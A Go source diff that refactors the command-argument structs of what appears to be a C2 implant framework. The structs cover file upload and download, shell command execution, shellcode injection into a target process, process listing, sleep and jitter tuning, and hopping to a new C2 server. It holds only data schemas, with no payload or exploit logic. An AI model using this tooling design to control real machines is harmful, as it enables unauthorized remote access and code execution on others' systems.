@@ -2,8 +2,11 @@ package models
 
 import "numinon_shadow/internal/agent/config"
 
-// UploadArgs defines arguments for the "upload_file" command.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
+// -------------------------------------------------------------------
+// | All the command-specific ARGUMENT structs, i.e. SERVER -> AGENT |
+// -------------------------------------------------------------------
+
+// UploadArgs defines arguments for the "upload" command.
 type UploadArgs struct {
 	TargetDirectory   string `json:"target_dir"`          // Absolute directory path on the agent's system
 	TargetFilename    string `json:"target_filename"`     // Desired filename on the agent's system
@@ -12,23 +15,20 @@ type UploadArgs struct {
 	OverwriteIfExists bool   `json:"overwrite_if_exists"` // Flag to allow overwriting if file exists
 }
 
-// DownloadArgs defines arguments for the "download_file" command.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
+// DownloadArgs defines arguments for the "download" command.
 type DownloadArgs struct {
 	SourceFilePath string `json:"source_file_path"` // Absolute path of the file to download from the agent's system
 }
 
-// RunCommandArgs defines arguments for the "run_cmd" command.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
-type RunCommandArgs struct {
+// RunCmdArgs defines arguments for the "run_cmd" command.
+type RunCmdArgs struct {
 	CommandLine string `json:"command_line"`    // The full command string to be executed
 	Shell       string `json:"shell,omitempty"` // Optional: "cmd", "powershell", "sh", "bash". Agent default if empty.
 	// TimeoutSeconds int `json:"timeout_seconds,omitempty"` // DEFERRED: Agent uses internal default for now
 }
 
-// ExecuteShellcodeArgs defines arguments for the "execute_shellcode" command.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
-type ExecuteShellcodeArgs struct {
+// ShellcodeArgs defines arguments for the "execute_shellcode" command.
+type ShellcodeArgs struct {
 	ShellcodeBase64             string `json:"shellcode_base64"`                    // Base64 encoded shellcode (DLL or BIN)
 	TargetPID                   uint32 `json:"target_pid,omitempty"`                // 0 or omitted for self-injection
 	ArgumentsForShellcodeBase64 string `json:"args_for_shellcode_base64,omitempty"` // Optional args for the shellcode/export
@@ -36,29 +36,13 @@ type ExecuteShellcodeArgs struct {
 	// If empty, loader might default to DllMain or a pre-agreed export.
 }
 
-// EnumerateProcessesArgs defines arguments for the "enumerate_processes" command.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
-type EnumerateProcessesArgs struct {
+// EnumerateArgs defines arguments for the "enumerate_processes" command.
+type EnumerateArgs struct {
 	ProcessName string `json:"process_name,omitempty"` // If empty, list all. Otherwise, filter by this name.
 	// Add future flags here e.g., IncludePath *bool, IncludeOwner *bool
 }
 
-// ProcessInfo holds information about a single running process (part of EnumerateProcesses result).
-// This struct is marshalled by the AGENT into TaskResult.Output.
-type ProcessInfo struct {
-	PID  uint32 `json:"pid"`  // Process ID
-	Name string `json:"name"` // Executable name (e.g., "notepad.exe")
-	// --- Future fields (commented out for initial implementation) ---
-	// PPID        uint32 `json:"ppid,omitempty"`       // Parent Process ID
-	// Path        string `json:"path,omitempty"`       // Full path to the executable
-	// Owner       string `json:"owner,omitempty"`      // User account running the process
-	// Arch        string `json:"arch,omitempty"`       // Architecture (e.g., "x86", "amd64")
-	// SessionID   uint32 `json:"session_id,omitempty"` // Terminal Services session ID (Windows)
-	// CommandLine string `json:"command_line,omitempty"`// Full command line
-}
-
 // MorphArgs defines parameters that can be dynamically updated in the agent.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
 type MorphArgs struct {
 	BaseSleep *string  `json:"base_sleep,omitempty"` // Duration string, e.g., "30s"
 	Jitter    *float64 `json:"jitter,omitempty"`     // e.g., 0.0 to 1.0
@@ -70,7 +54,6 @@ type MorphArgs struct {
 }
 
 // HopArgs defines parameters for the agent to transition its C2 communication.
-// Server marshals this to JSON and puts it in ServerTaskResponse.Data.
 type HopArgs struct {
 	NewProtocol          config.AgentProtocol `json:"new_protocol"`
 	NewServerIP          string               `json:"new_server_ip"`
@@ -86,4 +69,21 @@ type HopArgs struct {
 	NewMinPaddingBytes   *int                 `json:"new_min_padding_bytes,omitempty"`
 	NewMaxPaddingBytes   *int                 `json:"new_max_padding_bytes,omitempty"`
 	// No UUID since that will remain the same, Hop should not influence it
+}
+
+// ------------------------------------------------------------------
+// | All the command-specific RESULTS structs, i.e. AGENT -> SERVER |
+// ------------------------------------------------------------------
+
+// ProcessInfo holds information about a single running process (part of Enumerate result).
+type ProcessInfo struct {
+	PID  uint32 `json:"pid"`  // Process ID
+	Name string `json:"name"` // Executable name (e.g., "notepad.exe")
+	// --- Future fields (commented out for initial implementation) ---
+	// PPID        uint32 `json:"ppid,omitempty"`       // Parent Process ID
+	// Path        string `json:"path,omitempty"`       // Full path to the executable
+	// Owner       string `json:"owner,omitempty"`      // User account running the process
+	// Arch        string `json:"arch,omitempty"`       // Architecture (e.g., "x86", "amd64")
+	// SessionID   uint32 `json:"session_id,omitempty"` // Terminal Services session ID (Windows)
+	// CommandLine string `json:"command_line,omitempty"`// Full command line
 }
